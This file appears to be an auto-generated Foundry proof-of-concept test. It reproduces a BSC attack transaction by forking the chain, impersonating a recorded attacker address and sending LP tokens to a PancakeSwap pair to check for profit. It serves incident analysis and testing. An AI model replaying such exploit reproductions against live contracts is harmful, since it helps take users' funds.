// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0xbe8351c14e5108a57a545dfa8669fa31aa6adc68
// Attack Contract : 0x9753a64fb7c233fdc43f04dab9cca88e1e229eba
// Vulnerable Contract : 0x9753a64fb7c233fdc43f04dab9cca88e1e229eba
// Attack Tx : 0x5c27edc326e38641d8ce6093cd7f15ae5fca039f5fb988b7f10cb432e6e3a056
// Block : 105692847
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.AttackerEOA;
    address constant PANCAKE_PAIR = Addresses.PancakePair;
    uint256 constant LP_TRANSFER_AMOUNT = 400498341357466415661652;
    uint256 constant FORK_BLOCK = 105692846;
    uint256 constant TX_TIMESTAMP = 1782120218;
    uint256 constant TX_BLOCK_NUMBER = 105692847;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(PANCAKE_PAIR, address(0));
        attack();
        vm.stopPrank();
        _assertProfit();
    }

    function attack() internal {
        // Structured gap: the handoff exposes two observe-only storage effects for this transfer, both
        // missing semantic action bindings. Preserve the normal selector path; do not synthesize storage.
        bytes memory transferCall =
            abi.encodeWithSelector(IERC20Like.transfer.selector, PANCAKE_PAIR, LP_TRANSFER_AMOUNT);
        (bool ok, bytes memory result) = PANCAKE_PAIR.call{value: TX_VALUE}(transferCall);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
    }

    function _expectProfitLegs(address attackContract, address attackChild) internal override {
        attackChild;
        profitLegs.push(
            ProfitLeg({
                holder: attackContract,
                alternateHolder: address(0),
                asset: attackContract,
                symbol: "Cake-LP",
                expectedDeltaRaw: LP_TRANSFER_AMOUNT,
                strict: true,
                repairPolicy: PROFIT_REPAIR_OBSERVE_ONLY,
                balancerInternalBalance: false
            })
        );
    }
}

library Addresses {
    address internal constant PancakePair = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
    address internal constant AttackerEOA = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
}
